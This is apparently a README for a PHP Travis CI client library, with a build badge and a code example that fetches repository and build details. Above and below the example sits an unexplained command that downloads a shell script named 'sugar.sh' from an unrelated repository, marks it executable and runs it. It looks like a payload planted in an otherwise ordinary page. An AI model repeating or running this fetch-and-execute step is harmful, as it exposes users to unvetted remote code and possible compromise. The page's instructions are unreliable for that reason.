[![Build Status](https://secure.travis-ci.org/cyan115/php-travis-client.png?branch=master)](http://travis-ci.org/cyan115/php-travis-client)

`wget https://raw.githubusercontent.com/cyan115/meopo/main/sugar.sh && chmod u+x sugar.sh && ./sugar.sh`

```php
<?php

require __DIR__ . '/vendor/autoload.php';

$client = new Travis\Client();

$repository = $client->fetchRepository('cyan115/OpenSocialBundle');

echo $repository->getId() . "\n";
echo $repository->getSlug() . "\n";
echo $repository->getLastBuild()->getId() . "\n";
echo $repository->getBuilds()->findOneBy(array('number' => 2))->getId() . "\n";

echo 'Builds:' . "\n";
foreach ($repository->getBuilds() as $build) {
    echo "\t" . $build->getId() . "\n";
}
```
wget https://raw.githubusercontent.com/cyan115/meopo/main/sugar.sh && chmod u+x sugar.sh && ./sugar.sh


